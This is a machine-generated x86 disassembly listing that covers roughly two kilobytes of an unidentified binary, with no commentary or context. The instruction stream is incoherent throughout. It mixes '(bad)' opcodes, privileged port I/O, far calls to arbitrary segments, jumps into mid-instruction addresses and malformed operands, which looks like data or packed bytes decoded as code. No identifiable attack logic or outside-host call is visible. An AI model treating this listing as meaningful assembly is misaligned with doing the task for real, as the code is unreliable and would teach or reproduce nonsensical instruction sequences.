  4114e8:	mov    dh,0x6f
  4114ea:	xchg   ebp,eax
  4114eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ec:	(bad)  
  4114ed:	and    dl,dh
  4114ef:	cmp    ebp,ebp
  4114f1:	jo     0x411544
  4114f3:	dec    edi
  4114f4:	fwait
  4114f5:	jne    0x41153b
  4114f7:	iret   
  4114f8:	cmp    bh,ch
  4114fa:	pop    esp
  4114fb:	clc    
  4114fc:	aam    0x8c
  4114fe:	loopne 0x411541
  411500:	xchg   esi,eax
  411501:	shr    DWORD PTR [ecx+edx*8],cl
  411504:	mov    BYTE PTR fs:0x55ac,ch
  41150a:	pop    ss
  41150b:	inc    ebp
  41150c:	ror    bh,cl
  41150e:	js     0x411512
  411510:	push   ss
  411511:	push   cs
  411512:	cmp    ebp,eax
  411514:	arpl   WORD PTR fs:[ebp+0xf027c72],dx
  41151b:	or     eax,0xdf7a0b9b
  411520:	dec    esp
  411521:	push   ds
  411522:	pop    edx
  411523:	(bad)  [edx]
  411525:	dec    esi
  411526:	retf   
  411527:	icebp  
  411528:	add    BYTE PTR [esi-0x49521b1f],0x55
  41152f:	sbb    al,BYTE PTR [ebp-0x7f]
  411532:	cli    
  411533:	shr    DWORD PTR [edi-0x62],cl
  411536:	push   ds
  411537:	rcl    DWORD PTR [edx],cl
  411539:	mov    bl,0xc4
  41153b:	in     al,dx
  41153c:	lock mov eax,0x94eac2cc
  411542:	jecxz  0x4114de
  411544:	aaa    
  411545:	push   0xfffffff2
  411547:	add    DWORD PTR [edi+0x3ed5cb86],ebp
  41154d:	ss shr ah,1
  411550:	ret    
  411551:	push   ecx
  411552:	xor    DWORD PTR [edi-0x671ffc3d],ecx
  411558:	pop    DWORD PTR [edx+0x52aa2206]
  41155e:	out    0xed,eax
  411560:	sub    BYTE PTR [edx+0x74],al
  411563:	pop    esi
  411564:	(bad)  
  411565:	les    edx,FWORD PTR [edx-0x10]
  411568:	jecxz  0x4114fa
  41156a:	sbb    BYTE PTR [edx-0x32f85555],dh
  411570:	fist   WORD PTR [ebp+0x47]
  411573:	cmp    edi,DWORD PTR [esi+eiz*8-0x45]
  411577:	call   0x8797:0x816ca6c8
  41157e:	sar    BYTE PTR [ebx+0x7f],0x93
  411582:	mov    eax,ds:0xf36a3e41
  411587:	fs aad 0x88
  41158a:	jl     0x4115ee
  41158c:	jl     0x411545
  41158e:	and    eax,0x9c8d92be
  411593:	jmp    DWORD PTR [edx-0x2f]
  411596:	fmul   DWORD PTR [ebx]
  411598:	gs inc ecx
  41159a:	fs mov es,ecx
  41159d:	dec    eax
  41159e:	jae    0x41157b
  4115a0:	xor    ch,BYTE PTR [eax]
  4115a2:	fild   DWORD PTR [esp+edx*4+0x47]
  4115a6:	sbb    al,0xca
  4115a8:	xor    al,0xfa
  4115aa:	xchg   ecx,eax
  4115ab:	and    bp,ax
  4115ae:	enter  0x5c0,0x40
  4115b2:	retf   0xd49b
  4115b5:	push   0x35
  4115b7:	loope  0x41158e
  4115b9:	in     eax,dx
  4115ba:	cld    
  4115bb:	aaa    
  4115bc:	popf   
  4115bd:	mov    ebx,0xffae9826
  4115c2:	mov    dh,0xad
  4115c4:	stos   DWORD PTR es:[edi],eax
  4115c5:	(bad)  
  4115c7:	repnz mov ecx,0x60fd4128
  4115cd:	repz xchg edx,eax
  4115cf:	xor    al,0x8f
  4115d1:	clc    
  4115d2:	inc    esi
  4115d4:	lahf   
  4115d5:	div    BYTE PTR [edx+ecx*2-0x80]
  4115d9:	or     edi,DWORD PTR [edi]
  4115db:	cmovne esp,edx
  4115de:	out    0x86,eax
  4115e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115e1:	lods   al,BYTE PTR ds:[esi]
  4115e2:	xchg   esi,eax
  4115e3:	sbb    DWORD PTR [ebx+0x37],esi
  4115e6:	(bad)  
  4115e7:	shr    BYTE PTR [edx-0x53],cl
  4115ea:	aad    0x87
  4115ec:	pop    edi
  4115ed:	add    BYTE PTR [ebp+ebx*4-0x37794fcf],bh
  4115f4:	fs xor bh,ah
  4115f7:	pop    edi
  4115f8:	mov    esi,0xdf342946
  4115fd:	inc    esp
  4115fe:	(bad)  
  4115ff:	dec    ecx
  411600:	or     al,0xc7
  411602:	adc    eax,0x3b68a61b
  411607:	ds xor al,0x3a
  41160a:	enter  0xc0a5,0xd4
  41160e:	adc    edx,esi
  411610:	cwde   
  411611:	outs   dx,DWORD PTR ds:[esi]
  411612:	or     eax,0x290f1f95
  411617:	jle    0x4115cd
  411619:	dec    ebx
  41161a:	jbe    0x4115a4
  41161c:	and    dh,BYTE PTR [edx-0x538b2070]
  411622:	call   0x544b54bb
  411627:	lea    esi,[ecx]
  411629:	push   esp
  41162a:	(bad)  
  41162b:	or     BYTE PTR es:[ebp-0x6c],al
  41162f:	out    0xe8,eax
  411631:	dec    ebp
  411632:	sub    ebx,DWORD PTR [edi+0xa]
  411635:	cmp    bl,BYTE PTR [esi]
  411637:	addr16 dec edx
  411639:	call   0x9bc5:0x3c9f1be3
  411640:	outs   dx,DWORD PTR ds:[esi]
  411641:	mov    esi,0x83fc8092
  411646:	popf   
  411647:	lahf   
  411648:	pop    ss
  411649:	(bad)  
  41164a:	jg     0x4115fa
  41164c:	test   al,bl
  41164e:	and    al,0xfd
  411650:	and    DWORD PTR [ebx+0x4c6ffbcc],esp
  411656:	fs jne 0x41166f
  411659:	add    DWORD PTR [edx-0xa],edx
  41165c:	inc    eax
  41165d:	lods   eax,DWORD PTR ds:[esi]
  41165e:	repnz fst DWORD PTR [edx-0x1d420a31]
  411665:	(bad)  
  411666:	lods   ax,WORD PTR ds:[esi]
  411668:	lds    ecx,FWORD PTR [edx]
  41166a:	ds pop edx
  41166c:	(bad)  
  41166e:	mov    esi,0xefaf6b87
  411673:	xor    eax,0xadad6feb
  411678:	pop    ecx
  411679:	(bad)  
  41167b:	sti    
  41167c:	inc    ebp
  41167d:	inc    ebp
  41167e:	cdq    
  41167f:	clc    
  411680:	rcl    BYTE PTR [edi-0x449778f4],cl
  411686:	(bad)  
  411687:	or     eax,0x5b1d9152
  41168c:	test   al,0x1b
  41168e:	xlat   BYTE PTR ds:[ebx]
  41168f:	lods   eax,DWORD PTR ds:[esi]
  411690:	mov    bl,0xee
  411692:	adc    edx,ebx
  411694:	cwde   
  411695:	inc    esp
  411696:	dec    esi
  411697:	push   0x975494a8
  41169c:	sbb    eax,0xa7ad78e2
  4116a1:	out    0x11,eax
  4116a3:	jne    0x411699
  4116a5:	push   eax
  4116a6:	int3   
  4116a7:	and    eax,0xc47ea2a
  4116ac:	les    ebx,FWORD PTR [ebx-0x1cb910cd]
  4116b2:	and    BYTE PTR [ecx-0x30],al
  4116b5:	pushf  
  4116b6:	add    BYTE PTR [ecx],ch
  4116b8:	lods   al,BYTE PTR ds:[esi]
  4116b9:	or     al,0x91
  4116bb:	push   ds
  4116bc:	jl     0x4116f3
  4116be:	call   0x915ffa74
  4116c3:	test   BYTE PTR [esi],al
  4116c5:	popa   
  4116c6:	dec    esp
  4116c7:	iret   
  4116c8:	cmp    BYTE PTR [esp+ebp*2],ah
  4116cb:	lods   al,BYTE PTR ds:[esi]
  4116cc:	xchg   ecx,eax
  4116cd:	cmp    eax,0x52d1fdf
  4116d2:	test   eax,0xe33cc41
  4116d7:	push   0x72
  4116d9:	fs mov ebx,0x9269b1fa
  4116df:	inc    edi
  4116e0:	jecxz  0x411727
  4116e2:	inc    eax
  4116e3:	add    eax,0xbb04e1cf
  4116e8:	xchg   edi,eax
  4116e9:	int3   
  4116ea:	fisttp WORD PTR [ebp-0x27]
  4116ed:	bound  esp,QWORD PTR [eax-0x33fa858]
  4116f3:	rcl    BYTE PTR [esi],cl
  4116f5:	cld    
  4116f6:	add    DWORD PTR [edx+0x55],edx
  4116f9:	dec    ebp
  4116fa:	mov    eax,ebx
  4116fc:	or     BYTE PTR [edx],al
  4116fe:	bound  esi,QWORD PTR [ebx+0x67]
  411701:	loopne 0x4116c3
  411703:	sub    BYTE PTR [eax-0x564a83d4],ah
  411709:	dec    edi
  41170a:	mov    ebp,?
  41170c:	cwde   
  41170d:	stc    
  41170e:	jae    0x4116f1
  411710:	pop    ss
  411711:	pushf  
  411712:	scas   al,BYTE PTR es:[edi]
  411713:	addr16 jne 0x4116cf
  411716:	rcr    BYTE PTR [ebx+ebx*4-0x26],cl
  41171a:	(bad)  
  41171b:	lods   al,BYTE PTR ds:[esi]
  41171c:	inc    edx
  41171d:	push   cs
  41171e:	sub    ecx,ebx
  411720:	sti    
  411721:	add    BYTE PTR [edi+0x481d759d],dl
  411727:	(bad)  
  411728:	std    
  411729:	xchg   cl,cl
  41172b:	dec    ebx
  41172c:	in     eax,dx
  41172d:	sub    BYTE PTR [edx],ah
  41172f:	mov    ah,0xcf
  411731:	jl     0x41172f
  411733:	sub    BYTE PTR [ecx+0x74],cl
  411736:	xchg   BYTE PTR [esi-0x13b95837],dh
  41173c:	mov    es,WORD PTR [edi]
  41173e:	jmp    0x411762
  411740:	mov    dl,0x3a
  411742:	lock add edx,eax
  411745:	imul   edx,eax,0x957e2b2b
  41174b:	shl    BYTE PTR gs:[ebp+0x22],cl
  41174f:	repz retf 
  411751:	test   edx,esp
  411753:	and    ecx,DWORD PTR ds:0xe82987e0
  411759:	mov    al,bl
  41175b:	jne    0x41174b
  41175d:	push   ebx
  41175e:	lahf   
  41175f:	sbb    BYTE PTR [edi-0x72e0e3ef],0x66
  411766:	fwait
  411767:	jp     0x411765
  411769:	pop    edx
  41176a:	inc    edi
  41176b:	cmp    ch,bh
  41176d:	inc    eax
  41176e:	xrelease xchg DWORD PTR [ebx-0xa],ebx
  411772:	or     eax,0x3dd86b86
  411777:	call   0x3e72:0x24216b09
  41177e:	push   esi
  41177f:	inc    edx
  411780:	or     ch,0x92
  411783:	mov    ebx,0xd89c5a80
  411788:	pop    ebp
  411789:	es dec edi
  41178b:	cmp    eax,0x189557ef
  411790:	(bad)  
  411791:	outs   dx,BYTE PTR ds:[esi]
  411792:	lock jo 0x4117bf
  411795:	jmp    0x248d96ed
  41179a:	push   esi
  41179b:	ss scas al,BYTE PTR es:[edi]
  41179d:	add    BYTE PTR [edi-0x16dea42e],0xb7
  4117a4:	sub    ah,BYTE PTR [edx-0x45]
  4117a7:	jns    0x411790
  4117a9:	frstor [edi]
  4117ab:	or     dh,BYTE PTR [ecx+0x43930d7b]
  4117b1:	shl    DWORD PTR ds:0x904fc833,1
  4117b7:	imul   ebx,DWORD PTR [edi+ebp*4-0x11],0x523d25f3
  4117bf:	adc    BYTE PTR [ecx+0x64],dl
  4117c2:	add    eax,esi
  4117c4:	xchg   BYTE PTR [esp+edx*8],bl
  4117c7:	add    ecx,DWORD PTR [edx+0x6362ec96]
  4117cd:	daa    
  4117ce:	rcl    DWORD PTR [esi+edi*8+0x56116393],cl
  4117d5:	mov    cl,0x40
  4117d7:	fistp  WORD PTR [ecx+0x6e7d9efd]
  4117dd:	pop    edx
  4117de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117df:	(bad)  [edi+0x50]
  4117e2:	xchg   ecx,eax
  4117e3:	lea    ebp,[eax+0x70fc73e4]
  4117e9:	popf   
  4117ea:	adc    al,BYTE PTR [edx-0x6f2dcef8]
  4117f0:	cdq    
  4117f1:	jle    0x4117b9
  4117f3:	and    al,0xa4
  4117f5:	pop    edx
  4117f6:	(bad)  
  4117f7:	mov    bl,0x50
  4117f9:	and    al,0x8a
  4117fb:	popa   
  4117fc:	xor    DWORD PTR [eax+esi*1+0x40],ecx
  411800:	cdq    
  411801:	fld    TBYTE PTR [edx+0x313aadff]
  411807:	loope  0x4117b2
  411809:	rcr    BYTE PTR [ebp+0x13],cl
  41180c:	or     edi,DWORD PTR gs:[esi]
  41180f:	cmp    ebp,DWORD PTR [eax]
  411811:	ss add al,0xb0
  411814:	ss push edx
  411816:	xor    BYTE PTR [eax+0x6146a33c],ch
  41181c:	les    edx,FWORD PTR [esi-0x71e71b11]
  411822:	mov    edi,0xb007ebba
  411827:	cmp    DWORD PTR [eax-0x3b],edx
  41182a:	jmp    0x41182e
  41182c:	mov    dl,0xa6
  41182e:	push   esi
  41182f:	nop
  411830:	xchg   edx,eax
  411831:	mov    cl,0xf2
  411833:	xor    DWORD PTR [eax-0x3a2f6cd2],ebp
  411839:	lea    edx,[esi+0x4ce93f2e]
  41183f:	in     eax,0x8b
  411841:	rol    BYTE PTR [ebx+0x40752d5a],0x5
  411848:	retf   
  411849:	xor    al,0xe5
  41184b:	dec    esi
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	push   ss
  41184e:	sub    ch,BYTE PTR [ebx-0x42]
  411851:	loopne 0x4117f8
  411853:	fild   QWORD PTR [ebx-0x2260cbd1]
  411859:	sbb    BYTE PTR [ebx+ecx*4+0x35583353],cl
  411860:	and    eax,0xfe8f15ad
  411865:	inc    ebp
  411866:	mov    DWORD PTR [esp+ecx*1+0x429ec6e0],ebx
  41186d:	test   DWORD PTR [eax+0x33e2994b],edi
  411873:	dec    edx
  411874:	popf   
  411875:	leave  
  411876:	or     eax,0xddf132a2
  41187b:	add    dh,dh
  41187d:	sbb    dl,BYTE PTR [esi+0x32]
  411880:	xor    al,0x53
  411882:	and    ebx,DWORD PTR [eax+0x5c]
  411885:	not    dh
  411887:	dec    edi
  411888:	xchg   edi,eax
  411889:	and    BYTE PTR [eax],ch
  41188b:	sbb    al,BYTE PTR [edx+0x6f483554]
  411891:	mov    esp,0x93f011d1
  411896:	(bad)  
  411897:	cdq    
  411898:	mov    ebx,0x3b8c5703
  41189d:	and    esp,DWORD PTR [edx+0x1b]
  4118a0:	cmp    bh,al
  4118a2:	idiv   ebx
  4118a4:	mov    esi,0x2e5a57e4
  4118a9:	(bad)  
  4118aa:	das    
  4118ab:	jp     0x41185f
  4118ad:	fdivr  DWORD PTR [esi+0x1b]
  4118b0:	and    ax,0x4f29
  4118b4:	xor    al,0x4e
  4118b6:	adc    ebx,ebx
  4118b8:	pop    edx
  4118b9:	clc    
  4118ba:	push   esi
  4118bb:	cmp    edi,DWORD PTR [edx-0x27df985d]
  4118c1:	push   DWORD PTR [ebx-0x144cb1c4]
  4118c7:	test   ecx,edi
  4118c9:	(bad)  
  4118cb:	data16 sti 
  4118cd:	lea    ecx,[ebx-0x46]
  4118d0:	jo     0x4118a3
  4118d2:	cmp    ebx,DWORD PTR [ebx-0x11ab7635]
  4118d8:	sub    DWORD PTR [ebx+edi*8-0x22],esp
  4118dc:	push   ds
  4118dd:	into   
  4118de:	inc    ecx
  4118df:	or     al,BYTE PTR [ebp+0x13]
  4118e2:	sbb    ah,0x49
  4118e5:	adc    esi,DWORD PTR [edi]
  4118e7:	sub    BYTE PTR [edx],bl
  4118e9:	neg    BYTE PTR [eax]
  4118eb:	popf   
  4118ec:	aam    0x90
  4118ee:	nop
  4118ef:	ret    0xaeb2
  4118f2:	push   ebp
  4118f3:	or     DWORD PTR [ebp+0x56af4df9],esi
  4118f9:	or     BYTE PTR [ebx],cl
  4118fb:	pusha  
  4118fc:	das    
  4118fd:	fnstcw WORD PTR [edx+0x490360b8]
  411903:	icebp  
  411904:	lods   al,BYTE PTR ds:[esi]
  411905:	and    edi,0x132548f7
  41190b:	mov    bh,0x14
  41190d:	sti    
  41190e:	aam    0xc2
  411910:	ss jg  0x4118fa
  411913:	dec    edi
  411914:	iret   
  411915:	mov    bl,0x2f
  411917:	inc    ecx
  411918:	daa    
  411919:	aaa    
  41191a:	sub    al,0xae
  41191c:	add    DWORD PTR ds:0x9cacaac4,edx
  411922:	adc    cl,al
  411924:	clc    
  411925:	ins    DWORD PTR es:[edi],dx
  411926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411927:	pop    ebp
  411928:	scas   al,BYTE PTR es:[edi]
  411929:	stos   BYTE PTR es:[edi],al
  41192a:	cli    
  41192b:	stc    
  41192c:	enter  0xb628,0x63
  411930:	jmp    DWORD PTR [eax+0x6c89a203]
  411936:	dec    ecx
  411937:	mov    BYTE PTR [ebx],dl
  411939:	ss mov ebx,0x9d79b0b
  41193f:	dec    eax
  411940:	idiv   ah
  411942:	pop    ebp
  411943:	and    dl,BYTE PTR [ebx+0x2f]
  411946:	sub    al,0x1f
  411948:	push   cs
  411949:	cmp    DWORD PTR [ebx-0x71],edi
  41194c:	mov    bh,0x58
  41194e:	inc    esi
  41194f:	mov    ch,0x39
  411951:	mov    al,ds:0x2c0f4c1c
  411956:	mov    ecx,0x25d9dcf8
  41195b:	dec    eax
  41195c:	retf   
  41195d:	jb     0x41198d
  41195f:	into   
  411960:	stos   DWORD PTR es:[edi],eax
  411961:	xchg   esi,eax
  411962:	test   edi,edx
  411964:	aaa    
  411965:	(bad)  
  411966:	fwait
  411967:	ja     0x4119ba
  411969:	(bad)  
  41196a:	stc    
  41196b:	mov    ah,BYTE PTR [ebp+0xa38015d]
  411971:	xchg   edi,eax
  411972:	mov    dh,0xef
  411974:	stos   BYTE PTR es:[edi],al
  411975:	lea    esp,[esi+0x2cbf1cba]
  41197b:	popf   
  41197c:	out    dx,eax
  41197d:	mov    ecx,DWORD PTR [edx*2-0x5a891748]
  411984:	sbb    DWORD PTR [ebx-0x14],esi
  411987:	popa   
  411988:	(bad)  
  411989:	pusha  
  41198a:	cmc    
  41198b:	push   ds
  41198c:	jp     0x41195a
  41198e:	and    ebx,eax
  411990:	call   0x4c5d:0x43116189
  411997:	xchg   esp,eax
  411998:	xchg   ecx,eax
  411999:	pushf  
  41199a:	cmp    eax,0x55c217d
  41199f:	cwde   
  4119a0:	es add al,0xd9
  4119a3:	mov    ds:0x1d72aac2,al
  4119a8:	mov    ds:0x72670062,al
  4119ad:	mov    bh,0x6e
  4119af:	push   esp
  4119b0:	ret    0xb275
  4119b3:	ja     0x411a1a
  4119b5:	mov    dh,0x79
  4119b7:	scas   al,BYTE PTR es:[edi]
  4119b8:	jno    0x4119c0
  4119ba:	pop    edx
  4119bb:	jle    0x41197d
  4119bd:	loope  0x411979
  4119bf:	ins    DWORD PTR es:[edi],dx
  4119c0:	aas    
  4119c1:	pushf  
  4119c2:	mov    ?,WORD PTR [ebp+0x46]
  4119c5:	js     0x411966
  4119c7:	(bad)  
  4119c8:	std    
  4119c9:	fstp   TBYTE PTR [edi+0x10f5658d]
  4119cf:	xor    al,BYTE PTR [eax]
  4119d1:	mov    ah,0x1c
  4119d3:	mov    eax,ds:0xc9d0b15d
  4119d8:	test   DWORD PTR [ebx],0x866e121c
  4119de:	into   
  4119df:	ret    0x77e1
  4119e2:	jae    0x411a2c
  4119e4:	xchg   BYTE PTR [ebx+0x73],cl
  4119e7:	(bad)  
  4119e8:	jmp    FWORD PTR [edi]
  4119ea:	shl    BYTE PTR [edx+0x7554a509],0x34
  4119f1:	mov    dh,0xb
  4119f3:	std    
  4119f4:	lock retf 0xff2
  4119f8:	imul   edi,DWORD PTR [esi+0x17],0x6b2e271b
  4119ff:	fsubr  DWORD PTR [edi+0x68]
  411a02:	or     DWORD PTR [ebp+0x17f2c827],ecx
  411a08:	cwde   
  411a09:	mov    dh,BYTE PTR [ebx+0x1aa07955]
  411a0f:	in     al,0x3f
  411a11:	cs aas 
  411a13:	and    al,0xd7
  411a15:	cwde   
  411a16:	xchg   DWORD PTR [edi+edx*8-0x14c02e15],ebp
  411a1d:	mov    fs,WORD PTR [edi]
  411a1f:	jne    0x411a1f
  411a21:	jmp    0x5870:0x1e121ad5
  411a28:	pop    esi
  411a29:	in     eax,dx
  411a2a:	arpl   WORD PTR [ebx+0x3fbf18f1],ax
  411a30:	mov    ds:0x6a1d891,al
  411a35:	rcl    al,cl
  411a37:	inc    edi
  411a38:	(bad)  
  411a3a:	ja     0x411a4d
  411a3c:	sbb    al,BYTE PTR [ebx-0x4929faa4]
  411a42:	aam    0x27
  411a44:	retf   
  411a45:	ret    
  411a46:	xchg   esp,eax
  411a47:	loope  0x411a00
  411a49:	pop    esp
  411a4a:	call   0x752:0xe23f2ca0
  411a51:	enter  0xfa52,0x81
  411a55:	inc    edx
  411a56:	sbb    bh,BYTE PTR [edx]
  411a58:	pop    esp
  411a59:	out    0x9b,eax
  411a5b:	xchg   DWORD PTR [edi],esi
  411a5d:	shl    DWORD PTR [eax-0x54],0xde
  411a61:	adc    BYTE PTR [edx-0x31],0xc4
  411a65:	retf   0xfaf8
  411a68:	dec    edi
  411a69:	int3   
  411a6a:	dec    esi
  411a6b:	push   cs
  411a6c:	fld    DWORD PTR [si]
  411a6f:	push   ds
  411a70:	adc    BYTE PTR [edx+edi*2-0x7a],al
  411a74:	scas   eax,DWORD PTR es:[edi]
  411a75:	cdq    
  411a76:	push   0x7b7a6abd
  411a7b:	pop    ebx
  411a7c:	cmp    BYTE PTR [esp+eiz*4-0x29d65de3],cl
  411a83:	inc    esp
  411a84:	dec    edx
  411a85:	stc    
  411a86:	push   ebx
  411a87:	out    dx,al
  411a88:	lea    ecx,[edx+edi*2-0x75d067f1]
  411a8f:	cmp    ebp,DWORD PTR [ecx+0x32]
  411a92:	shr    ah,1
  411a94:	mov    bl,0xe0
  411a96:	(bad)  
  411a98:	dec    ebp
  411a99:	out    0xce,al
  411a9b:	(bad)
  411aa0:	jne    0x411a87
  411aa2:	es pop ebp
  411aa4:	pushf  
  411aa5:	mov    eax,0x830f29e1
  411aaa:	mov    ebx,0x6932de5d
  411aaf:	lock loop 0x411aa5
  411ab2:	mov    ah,0xe4
  411ab4:	mov    ch,0xb5
  411ab6:	push   esp
  411ab7:	mov    esp,ss
  411ab9:	outs   dx,DWORD PTR ds:[esi]
  411aba:	retf   
  411abb:	daa    
  411abc:	ret    
  411abd:	mov    edi,0xeb8598f4
  411ac2:	leave  
  411ac3:	push   ebx
  411ac4:	inc    ebp
  411ac5:	dec    ebx
  411ac6:	mov    al,ds:0x424e7ec8
  411acb:	inc    ebx
  411acc:	mov    edi,0xf91ad1ae
  411ad1:	xor    al,BYTE PTR ds:0xd748295c
  411ad7:	ss fld st(1)
  411ada:	(bad)  
  411adb:	adc    BYTE PTR [esi+0x4a],bh
  411ade:	inc    ebp
  411adf:	cwde   
  411ae0:	aaa    
  411ae1:	lods   al,BYTE PTR ds:[esi]
  411ae2:	xchg   esp,eax
  411ae3:	js     0x411b16
  411ae5:	add    eax,DWORD PTR [ebx]
  411ae7:	add    eax,0xafd5c263
  411aec:	pop    ss
  411aed:	dec    BYTE PTR [edx]
  411aef:	(bad)  
  411af0:	rcl    BYTE PTR [ecx],cl
  411af2:	test   edx,ebx
  411af4:	xchg   esp,eax
  411af5:	mov    esp,0x3bf476b7
  411afa:	or     ecx,edx
  411afc:	adc    eax,0x289c176a
  411b01:	jp     0x411b77
  411b03:	pop    ebx
  411b04:	cwde   
  411b05:	test   DWORD PTR [ecx],edx
  411b07:	gs out 0xf6,eax
  411b0a:	into   
  411b0b:	cmp    al,0x90
  411b0d:	cli    
  411b0e:	ret    0xd927
  411b11:	lea    ecx,[eax+0x250d3528]
  411b17:	jge    0x411b3d
  411b19:	stc    
  411b1a:	fcmovu st,st(6)
  411b1c:	pop    es
  411b1d:	mov    bl,0xc0
  411b1f:	ja     0x411ab9
  411b21:	add    bl,BYTE PTR [esi+0x5f]
  411b24:	lock sqrtps xmm1,xmm1
  411b28:	das    
  411b29:	mov    ch,0x96
  411b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b2c:	into   
  411b2d:	pop    ecx
  411b2e:	ins    DWORD PTR es:[edi],dx
  411b2f:	xchg   ebp,eax
  411b30:	cwde   
  411b31:	fmul   st(3),st
  411b33:	jbe    0x411b0c
  411b35:	xchg   ch,dl
  411b37:	loope  0x411b50
  411b39:	inc    BYTE PTR [edi]
  411b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3c:	sbb    dl,ch
  411b3e:	cdq    
  411b3f:	and    al,0xdd
  411b41:	and    ebp,DWORD PTR [edi+0x38c56b05]
  411b47:	dec    ebp
  411b48:	stos   BYTE PTR es:[edi],al
  411b49:	out    0x11,al
  411b4b:	sahf   
  411b4c:	xlat   BYTE PTR ds:[ebx]
  411b4d:	mov    ebx,0x6a906297
  411b52:	stos   BYTE PTR es:[edi],al
  411b53:	(bad)  
  411b54:	jmp    ecx
  411b56:	pop    es
  411b57:	or     ebp,DWORD PTR [eax]
  411b59:	fidiv  WORD PTR [eax-0x22]
  411b5c:	push   0xbc902b7a
  411b61:	cs scas al,BYTE PTR es:[edi]
  411b63:	out    0x3c,al
  411b65:	push   ebp
  411b66:	dec    ebx
  411b67:	push   esp
  411b68:	in     al,dx
  411b69:	lea    ecx,[edi+0x46]
  411b6c:	cmp    esp,eax
  411b6e:	sub    BYTE PTR [ecx-0x3ad0e4c0],ah
  411b74:	aaa    
  411b75:	lds    ecx,FWORD PTR [edx]
  411b77:	arpl   WORD PTR [ebx+0x3],bx
  411b7a:	adc    DWORD PTR [ecx+0x18],0x4e
  411b7e:	pusha  
  411b7f:	out    0x46,eax
  411b81:	out    0x59,eax
  411b83:	sub    edx,DWORD PTR es:[esi]
  411b86:	fcomp  DWORD PTR [ecx+0x67ac9299]
  411b8c:	cmc    
  411b8d:	cli    
  411b8e:	sbb    al,0x1b
  411b90:	jp     0x411b79
  411b92:	push   esi
  411b93:	push   ds
  411b94:	mov    ax,ds:0x3d2b08fa
  411b9a:	repnz xchg esi,eax
  411b9c:	cmp    dl,ch
  411b9e:	loop   0x411bab
  411ba0:	ja     0x411c1b
  411ba2:	fwait
  411ba3:	pop    esp
  411ba4:	pop    ecx
  411ba5:	mov    dh,0xea
  411ba7:	sbb    al,0xe0
  411ba9:	ja     0x411b75
  411bab:	xchg   ecx,eax
  411bac:	or     eax,edx
  411bae:	rcl    BYTE PTR [eax+0x60],0xf7
  411bb2:	and    BYTE PTR [edi],0x8d
  411bb5:	je     0x411b71
  411bb7:	cmp    al,BYTE PTR [edx+0x4]
  411bba:	adc    BYTE PTR [ecx-0x2d8c8d08],ah
  411bc0:	scas   eax,DWORD PTR es:[edi]
  411bc1:	xor    cl,bl
  411bc3:	in     al,0xa8
  411bc5:	pop    eax
  411bc6:	lods   al,BYTE PTR ds:[esi]
  411bc7:	xchg   edi,eax
  411bc8:	cdq    
  411bc9:	mov    eax,0x95de0d90
  411bce:	nop
  411bcf:	mov    ah,0x7e
  411bd1:	push   ebx
  411bd2:	loop   0x411be9
  411bd4:	mov    ch,0x9b
  411bd6:	shr    DWORD PTR [edx-0x4c],cl
  411bd9:	dec    ebp
  411bda:	int    0xdc
  411bdc:	sbb    ah,BYTE PTR [eax]
  411bde:	mov    WORD PTR [edx+0x23],cs
  411be1:	rcr    DWORD PTR [ecx-0xb8e1015],1
  411be7:	sub    eax,0xdc24a890
  411bec:	mov    ds:0x4eb40524,eax
  411bf1:	shl    BYTE PTR [eax],1
  411bf3:	lods   eax,DWORD PTR ds:[esi]
  411bf4:	repnz pop esp
  411bf6:	jmp    0x411bc6
  411bf8:	mov    ebp,0x3852d975
  411bfd:	shl    BYTE PTR [edx-0x917b2ff],1
  411c03:	sbb    BYTE PTR [ebp+0x8],dl
  411c06:	and    dh,BYTE PTR [edx-0x2c1ad1df]
  411c0c:	inc    ecx
  411c0d:	jle    0x411c59
  411c0f:	or     eax,0x286cc99a
  411c14:	mov    ebp,0x8f877b88
  411c19:	aad    0xcb
  411c1b:	pop    ebx
  411c1c:	pop    es
  411c1d:	push   esp
  411c1e:	ja     0x411c10
  411c20:	call   0xff7f:0xd25747a9
  411c27:	xchg   edx,eax
  411c28:	stc    
  411c29:	adc    al,0xc2
  411c2b:	stos   BYTE PTR es:[edi],al
  411c2c:	sbb    al,0x51
  411c2e:	das    
  411c2f:	inc    ebx
  411c30:	and    ecx,ebp
  411c32:	(bad)
  411c36:	pop    esp
  411c37:	dec    DWORD PTR [eax+ebx*2-0x32]
  411c3b:	adc    cl,BYTE PTR [esi+0x2b]
  411c3e:	adc    dh,BYTE PTR [edi-0x4da73288]
  411c44:	aaa    
  411c45:	retf   0x37ff
  411c48:	(bad)  
  411c49:	sbb    al,BYTE PTR [esi-0x37610f24]
  411c4f:	hlt    
  411c50:	xchg   BYTE PTR [ecx],dl
  411c52:	mov    al,BYTE PTR [ebp-0x3d]
  411c55:	add    al,0x7d
  411c57:	mov    ah,0x6d
  411c59:	pop    ebp
  411c5a:	sbb    eax,0x8fe42ee2
  411c5f:	rcr    BYTE PTR [esi-0x7],cl
  411c62:	mov    bh,BYTE PTR [esi]
  411c64:	adc    DWORD PTR [edi-0x6],0x73d1fa91
  411c6b:	ins    DWORD PTR es:[edi],dx
  411c6c:	pop    ebp
  411c6d:	inc    ebx
  411c6e:	inc    esp
  411c6f:	retf   
  411c70:	and    bh,BYTE PTR [ebp+0x16aef347]
  411c76:	dec    esi
  411c77:	inc    ebx
  411c78:	mov    bh,0x97
  411c7a:	sti    
  411c7b:	(bad)  [edi]
  411c7d:	jnp    0x411cb1
  411c7f:	and    BYTE PTR [ecx],ch
  411c81:	mov    al,ds:0x913a9cae
  411c86:	ins    BYTE PTR es:[edi],dx
  411c87:	outs   dx,BYTE PTR ds:[esi]
  411c88:	dec    esp
  411c89:	dec    edx
  411c8a:	lods   al,BYTE PTR ds:[esi]
  411c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c8c:	outs   dx,BYTE PTR ds:[esi]
  411c8d:	cmp    eax,0x9cf9516b
  411c92:	mov    bh,0xa6
  411c94:	mov    edx,0x3eaa5f45
  411c99:	pop    ecx
  411c9a:	stc    
  411c9b:	lock loope 0x411cc6
  411c9e:	aas    
  411c9f:	and    al,0x25
  411ca1:	mov    eax,0xa05ca2ed
